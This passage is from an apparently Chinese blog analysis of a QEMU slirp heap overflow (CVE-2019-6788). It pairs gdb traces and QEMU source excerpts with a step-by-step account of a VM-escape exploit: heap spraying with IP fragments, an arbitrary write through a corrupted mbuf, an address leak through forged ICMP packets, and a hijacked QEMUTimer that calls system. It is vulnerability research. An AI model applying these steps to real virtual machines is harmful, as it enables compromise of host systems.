0x55ea3f7d0a10 &lt;tcp_input+3113&gt;:     mov    eax,ecx</span><br><span class="line">=&gt; 0x55ea3f7d0a12 &lt;tcp_input+3115&gt;:     cmp    edx,eax</span><br><span class="line">   0x55ea3f7d0a14 &lt;tcp_input+3117&gt;:     ja     0x55ea3f7d0aac &lt;tcp_input+3269&gt;</span><br><span class="line">   0x55ea3f7d0a1a &lt;tcp_input+3123&gt;:     mov    edx,DWORD PTR [rbx+0x98]</span><br><span class="line">   0x55ea3f7d0a20 &lt;tcp_input+3129&gt;:     movzx  eax,WORD PTR [r12+0x2e]</span><br><span class="line">   0x55ea3f7d0a26 &lt;tcp_input+3135&gt;:     movzx  eax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br></pre></td></tr></table></figure>
<p>断点第二次断到了拷贝函数，拷贝之后我们可以看到sb_wptr已经存放了输入数据，而sb_cc仍为0，而比较函数仍可以通过。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p *so_rcv</span><br><span class="line"><span class="variable">$8</span> = &#123;</span><br><span class="line">  sb_cc = 0x0,</span><br><span class="line">  sb_datalen = 0x2238,</span><br><span class="line">  sb_wptr = 0x7f3f78205400 <span class="string">"d"</span>,</span><br><span class="line">  sb_rptr = 0x7f3f78204f00 <span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...,</span><br><span class="line">  sb_data = 0x7f3f78204f00 <span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p *m</span><br><span class="line"><span class="variable">$9</span> = &#123;</span><br><span class="line">  m_next = 0x7f3f78208a70, </span><br><span class="line">  m_prev = 0x55ea40fc04a8, </span><br><span class="line">  m_nextpkt = 0x0, </span><br><span class="line">  m_prevpkt = 0x0, </span><br><span class="line">  m_flags = 0x4, </span><br><span class="line">  m_size = 0x608, </span><br><span class="line">  m_so = 0x7f3f78214e00, </span><br><span class="line">  m_data = 0x7f3f7820d6b4 <span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;..., </span><br><span class="line">  m_len = 0x500, </span><br><span class="line">  slirp = 0x55ea40fc0400, </span><br><span class="line">  resolution_requested = 0x0, </span><br><span class="line">  expiration_date = 0xffffffffffffffff, </span><br><span class="line">  m_ext = 0x0, </span><br><span class="line">  m_dat = 0x7f3f7820d660 <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>再过一次拷贝,sb_wptr继续递增，直到超出分配的0x2238的空间，最终覆盖某些关键数据结构造成crash。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p* so_rcv</span><br><span class="line">$14 = &#123;</span><br><span class="line">  sb_cc = 0x0, </span><br><span class="line">  sb_datalen = 0x2238, </span><br><span class="line">  sb_wptr = 0x7f3f78205900 &quot;\264&quot;, </span><br><span class="line">  sb_rptr = 0x7f3f78205900 &quot;\264&quot;, </span><br><span class="line">  sb_data = 0x7f3f78204f00 &apos;A&apos; &lt;repeats 200 times&gt;...</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p* m</span><br><span class="line">$15 = &#123;</span><br><span class="line">  m_next = 0x7f3f78213600, </span><br><span class="line">  m_prev = 0x55ea40fc04a8, </span><br><span class="line">  m_nextpkt = 0x0, </span><br><span class="line">  m_prevpkt = 0x0, </span><br><span class="line">  m_flags = 0x4, </span><br><span class="line">  m_size = 0x608, </span><br><span class="line">  m_so = 0x7f3f7850c000, </span><br><span class="line">  m_data = 0x7f3f78208b24 &apos;A&apos; &lt;repeats 200 times&gt;..., </span><br><span class="line">  m_len = 0x500, </span><br><span class="line">  slirp = 0x55ea40fc0400, </span><br><span class="line">  resolution_requested = 0x0, </span><br><span class="line">  expiration_date = 0xffffffffffffffff, </span><br><span class="line">  m_ext = 0x0, </span><br><span class="line">  m_dat = 0x7f3f78208ad0 &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ x/8gx 0x7f3f78204f00-0x10</span><br><span class="line">0x7f3f78204ef0: 0x0000000000000000      0x0000000000002245</span><br><span class="line">0x7f3f78204f00: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7f3f78204f10: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7f3f78204f20: 0x4141414141414141      0x414141414141414</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里的exp是分析的raycp师傅的，因为编译环境和运行环境不太一样，中间调整了一些变量的值。</p>
<h3 id="malloc原语"><a href="#malloc原语" class="headerlink" title="malloc原语"></a>malloc原语</h3><p>qemu的堆排布非常复杂，我们想要控制堆，就需要先将空闲的堆块分配完，之后从top_chunk开始分配，方可通过可控的堆溢出覆写某些数据结构。首先让我们重温一下IP协议。</p>
<p>如下图所示是一个IP数据包的示意图，linux下的数据结构对应图里的各个字段。</p>
<p>重点关注<code>Flags</code>字段和<code>Fragment Offset</code>字段。</p>
<ol>
<li>Zero:Unused，置为0</li>
<li>Do not fragment flag:表示数据包是否为分片数据包，当置为1时，表示未分片，简写为DF位</li>
<li>More fragments following flag:表示后续还有没无分包，有的话置为1，简写为MF位</li>
<li>Fragment Offset：当前数据包在整个大数据包中的偏移offset。</li>
</ol>
<p>IP包的total_length用2字节表示，因此一个IP数据包最大为65535字节，一旦要发送大量数据时我们需要对数据包进行分段传输，我们看下qemu对于这部分功能的实现。</p>
<p><img src="/2021/01/02/cve-2019-6788/1.jpg" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structure of an internet header, naked of options.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We declare ip_len and ip_off to be short, rather than u_short</span></span><br><span class="line"><span class="comment"> * pragmatically since otherwise unsigned comparisons can result</span></span><br><span class="line"><span class="comment"> * against negative integers quite easily, and fail in subtle ways.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == LITTLE_ENDIAN </span></span><br><span class="line">    u_char  ip_hl:<span class="number">4</span>,        <span class="comment">/* header length */</span></span><br><span class="line">        ip_v:<span class="number">4</span>;         <span class="comment">/* version */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == BIG_ENDIAN </span></span><br><span class="line">    u_char  ip_v:<span class="number">4</span>,         <span class="comment">/* version */</span></span><br><span class="line">        ip_hl:<span class="number">4</span>;        <span class="comment">/* header length */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    u_char  ip_tos;         <span class="comment">/* type of service */</span></span><br><span class="line">    short   ip_len;         <span class="comment">/* total length */</span></span><br><span class="line">    u_short ip_id;          <span class="comment">/* identification */</span></span><br><span class="line">    short   ip_off;         <span class="comment">/* fragment offset field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP_DF 0x4000            <span class="comment">/* dont fragment flag */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP_MF 0x2000            <span class="comment">/* more fragments flag */</span></span></span><br><span class="line">    u_char  ip_ttl;         <span class="comment">/* time to live */</span></span><br><span class="line">    u_char  ip_p;           <span class="comment">/* protocol */</span></span><br><span class="line">    u_short ip_sum;         <span class="comment">/* checksum */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ip_src</span>,<span class="title">ip_dst</span>;</span>  <span class="comment">/* source and dest address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该函数位于<code>slirp/ip_input.c</code>中，每次遇到一个分片的数据包时(IP_DF=0)，分配一个mbuf指针类型的链表用以存放分包，这里的<code>g_malloc</code>经过调试分配的大小为<code>0x668</code>。</p>
<p>因此我们构造DF=0的IP协议包，多次发送清空空闲内存。(这里的链表指针只有当接收到最后一个数据包后才会在<code>m_cat</code>函数中拼接所有数据包并释放链表)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ip_input(struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">	 * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">	 * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">	 * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">	 * but it's not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * XXX This should fail, don't fragment yet</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Look for queue of fragments</span></span><br><span class="line"><span class="comment">		 * of this datagram.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">		     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, struct ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">		    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">	found:</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Adjust ip_len to not reflect header,</span></span><br><span class="line"><span class="comment">		 * set ip_mff if more fragments are expected,</span></span><br><span class="line"><span class="comment">		 * convert offset of this to bytes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">		  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">		 * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">		 * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">			ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			m = dtom(slirp, ip);</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">if</span> (fp)</span><br><span class="line">		   	   ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If first fragment to arrive, create a reassembly queue.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">        <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">m_get</span>(<span class="title">slirp</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *</span></span><br><span class="line"><span class="class"><span class="title">m_get</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"m_get"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;</span><br><span class="line">                m = g_malloc(SLIRP_MSIZE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/cve-2019-6788/4.png" alt></p>
<p><img src="/2021/01/02/cve-2019-6788/5.png" alt></p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>任意地址写基于堆溢出，我们回顾一下刚才的<code>ip_input</code>函数，当IP_DF为0时调用<code>ip_reass</code>函数。当IP_MF不为1时(这里有个问题是为什么拿ipf_tos表示，正常对应ip包的service type位)，即当前数据包为分包的最后一个，进入下面的循环进行链表数据包的拼接。</p>
<p>假设我们可以控制m-&gt;m_data以及m-&gt;m_len和n-&gt;m_data，就可以通过<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</code>拷贝可控数据到任意地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">if</span> (((struct ipasfrag *)(q-&gt;ipf_prev))-&gt;ipf_tos &amp; <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reassembly is complete; concatenate fragments.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    q = fp-&gt;frag_link.next;</span><br><span class="line">	m = dtom(slirp, q);</span><br><span class="line"></span><br><span class="line">	q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	<span class="keyword">while</span> (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">dtom</span>(<span class="title">slirp</span>, <span class="title">q</span>);</span></span><br><span class="line">	  q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	  m_cat(m, t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">m_cat(struct mbuf *m, struct mbuf *n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there's no room, realloc</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)</span><br><span class="line">		m_inc(m, m-&gt;m_len + n-&gt;m_len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</span><br><span class="line">	m-&gt;m_len += n-&gt;m_len;</span><br><span class="line"></span><br><span class="line">	m_free(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp中的arb_write逻辑如下。首先spray多次调用malloc清空堆内存，同主机建立connection从而申请得到so_rcv结构体，再发送一个MF为1的数据包，id为0xdead，触发分配0x668的mbuf，这个数据包刚好位于so_rcv的后面，我们通过write堆溢出覆写其m_data部分为指定地址(这里也可以部分写低地址)。之后再发送一个id相同，MF为0的数据包，触发合并，memcpy调用，<code>send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</code>将指定数据拷贝到m_data所在的地址。</p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>泄露地址这个方法感觉非常巧妙，是拿icmp的响应包来实现的，既然都复习了IP协议，不妨多来看一眼tcp协议和icmp协议。如下图所示。</p>
<p>字段就不过多解释了，方便看exp的时候能对照上。</p>
<p><img src="/2021/01/02/cve-2019-6788/2.jpg" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line"> * TCP header.</span><br><span class="line"> * Per RFC <span class="number">793</span>, September, <span class="number">1981.</span></span><br><span class="line"> */</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> &#123;</span></span><br><span class="line">    u_short th_sport;       <span class="comment">/* source port */</span></span><br><span class="line">    u_short th_dport;       <span class="comment">/* destination port */</span></span><br><span class="line">    tcp_seq th_seq;         <span class="comment">/* sequence number */</span></span><br><span class="line">    tcp_seq th_ack;         <span class="comment">/* acknowledgement number */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == LITTLE_ENDIAN </span></span><br><span class="line">    u_char  th_x2:<span class="number">4</span>,        <span class="comment">/* (unused) */</span></span><br><span class="line">        th_off:<span class="number">4</span>;       <span class="comment">/* data offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == BIG_ENDIAN </span></span><br><span class="line">    u_char  th_off:<span class="number">4</span>,       <span class="comment">/* data offset */</span></span><br><span class="line">        th_x2:<span class="number">4</span>;        <span class="comment">/* (unused) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    u_char  th_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_FIN  0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_SYN  0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_RST  0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_ACK  0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_URG  0x20</span></span><br><span class="line">    u_short th_win;         <span class="comment">/* window */</span></span><br><span class="line">    u_short th_sum;         <span class="comment">/* checksum */</span></span><br><span class="line">    u_short th_urp;         <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/cve-2019-6788/3.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int8_t</span> icmp_type; <span class="comment">/* type of message, see below */</span></span><br><span class="line"><span class="keyword">u_int8_t</span> icmp_code; <span class="comment">/* type sub code */</span></span><br><span class="line"><span class="keyword">u_int16_t</span> icmp_cksum; <span class="comment">/* ones complement checksum of struct */</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line">u_char ih_pptr; <span class="comment">/* ICMP_PARAMPROB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">ih_gwaddr</span>;</span> <span class="comment">/* gateway address */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_idseq</span> /* <span class="title">echo</span> <span class="title">datagram</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int16_t</span> icd_id;</span><br><span class="line"><span class="keyword">u_int16_t</span> icd_seq;</span><br><span class="line">&#125; ih_idseq;</span><br><span class="line"><span class="keyword">u_int32_t</span> ih_void;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ICMP_UNREACH_NEEDFRAG -- Path MTU Discovery (RFC1191) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_pmtu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int16_t</span> ipm_void;</span><br><span class="line"><span class="keyword">u_int16_t</span> ipm_nextmtu;</span><br><span class="line">&#125; ih_pmtu;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ih_rtradv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int8_t</span> irt_num_addrs;</span><br><span class="line"><span class="keyword">u_int8_t</span> irt_wpa;</span><br><span class="line"><span class="keyword">u_int16_t</span> irt_lifetime;</span><br><span class="line">&#125; ih_rtradv;</span><br><span class="line">&#125; icmp_hun;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_pptr icmp_hun.ih_pptr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_gwaddr icmp_hun.ih_gwaddr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_id icmp_hun.ih_idseq.icd_id</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_seq icmp_hun.ih_idseq.icd_seq</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_void icmp_hun.ih_void</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_pmvoid icmp_hun.ih_pmtu.ipm_void</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_nextmtu icmp_hun.ih_pmtu.ipm_nextmtu</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_num_addrs icmp_hun.ih_rtradv.irt_num_addrs</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_wpa icmp_hun.ih_rtradv.irt_wpa</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_lifetime icmp_hun.ih_rtradv.irt_lifetime</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">u_int32_t</span> its_otime;</span><br><span class="line"><span class="keyword">u_int32_t</span> its_rtime;</span><br><span class="line"><span class="keyword">u_int32_t</span> its_ttime;</span><br><span class="line">&#125; id_ts;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">idi_ip</span>;</span></span><br><span class="line"><span class="comment">/* options and then 64 bits of data */</span></span><br><span class="line">&#125; id_ip;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp_ra_addr</span> <span class="title">id_radv</span>;</span></span><br><span class="line"><span class="keyword">u_int32_t</span> id_mask;</span><br><span class="line"><span class="keyword">u_int8_t</span> id_data[<span class="number">1</span>];</span><br><span class="line">&#125; icmp_dun;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_otime icmp_dun.id_ts.its_otime</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_rtime icmp_dun.id_ts.its_rtime</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_ttime icmp_dun.id_ts.its_ttime</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_ip icmp_dun.id_ip.idi_ip</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_radv icmp_dun.id_radv</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_mask icmp_dun.id_mask</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> icmp_data icmp_dun.id_data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>说回这里的leak方法。</p>
<ol>
<li>首先通过堆溢出覆写m_data的低位为0xb00(因为该heap所在的内存页虚拟地址为0xxx000000)，不会存在越界的问题。</li>
<li>通过任意地址写将伪造的icmp包写入到0x7fxxxb00+0x318+0x14+14处(eth报头14字节，IP报头0x14字节，m_len为0x318)</li>
<li>再来一次任意写，先connect得到so_rcv，再发送一个ICMP请求包，数据包的MF为1，其mbuf会被分配到so_rcv的后面</li>
<li>故技重施，利用so_rcv溢出到mbuf-&gt;m_data，改为0xb00+0x318+14+0x14(我们之前伪造的icmp包的位置)</li>
<li>发一个MF=0的包，触发ICMP的响应，得到伪造的icmp数据包及后面的脏数据，从而leak出text地址和heap地址。</li>
</ol>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>最后劫持控制流的方法还是用QemuTimer，在bss有个全局变量<code>main_loop_tlg</code>，类型为QEMUTimerList，其成员active_timers为QEMUTimer*类型的变量，我们在堆上伪造这两个变量，覆写bss的全局变量，伪造cb为system@plt，opaque为参数地址，当expire_time过完就会触发命令执行。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">.bss:00000000012C3900 main_loop_tlg   QEMUTimerListGroup_0 &lt;?&gt;</span><br><span class="line">.bss:00000000012C3900                                         ; DATA XREF: qemu_clock_init+28↑o</span><br><span class="line">.bss:00000000012C3900                                         ; qemu_clock_init+C0↑o ...</span><br><span class="line">.bss:00000000012C3920 ; QEMUClock_0 qemu_clocks[4]</span><br><span class="line">.bss:00000000012C3920 qemu_clocks     QEMUClock_0 4 dup(&lt;?&gt;)  ; DATA XREF: qemu_clock_ptr+11↑o</span><br><span class="line">.bss:00000000012C39A0 ; AioContext_0 *qemu_aio_context</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// util/qemu-timer.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="keyword">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist's running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/qemu/timer.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;  <span class="comment">// 函数指针</span></span><br><span class="line">    <span class="keyword">void</span> *opaque;     <span class="comment">// 参数</span></span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="调试记录"><a href="#调试记录" class="headerlink" title="调试记录"></a>调试记录</h2><p><code>raycp</code>师傅的exp注释写的很详尽，不过中间有一些不太好理解的地方，这里记录了一下自己动态调试的过程备忘。</p>
<p>寻找地址的方法：payload里给特殊字符，gdb里find字符串定位关键数据结构。</p>
<ol>
<li>第一次堆溢出覆写m_data为0xb00</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/6.png" alt></p>
<ol start="2">
<li>通过任意地址写写入伪造的eth+ip+icmp包</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/8.png" alt></p>
<ol start="3">
<li>第二次堆溢出覆写m_data为0xb00+0x14+0x318+14的icmp伪造包处</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/9.png" alt></p>
<ol start="4">
<li>根据leak的数据反查内存</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/10.png" alt></p>
<ol start="5">
<li>对比之后确认泄露的内存恰为我们输入的伪造icmp地址处，不过在输出前做了一次拷贝</li>
</ol>
<p><img src="/2021/01/02/cve-2019-6788/11.png" alt></p>
<ol start="6">
